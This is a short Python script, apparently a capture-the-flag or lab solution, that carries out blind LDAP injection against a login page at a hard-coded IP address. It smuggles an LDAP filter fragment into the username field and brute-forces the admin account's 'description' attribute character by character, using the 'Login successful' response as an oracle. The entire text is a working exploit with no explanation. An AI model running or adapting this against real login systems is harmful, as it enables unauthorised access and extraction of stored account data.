import requests, string

URL = "http://94.237.53.146:48403/index.php"
POSITIVE_STRING = "Login successful"
EXFILTRATE_USER = 'admin'
EXFILTRATE_ATTRIBUTE = 'description'

if __name__ == '__main__':
	stop = False
	found_char = True
	flag = ''
	
	proxies = { 'http':'http://127.0.0.1:8080'}

	while not stop:
		found_char = False
		for c in string.printable:
			username = f'{EXFILTRATE_USER})(|({EXFILTRATE_ATTRIBUTE}={flag}{c}*'
			password = 'invalid)'
			r = requests.post(URL, data={'username': username, 'password': password}, proxies=proxies)

			if POSITIVE_STRING in r.text:
				found_char = True
				flag += c
				break

		if not found_char:
			print(flag)
			break

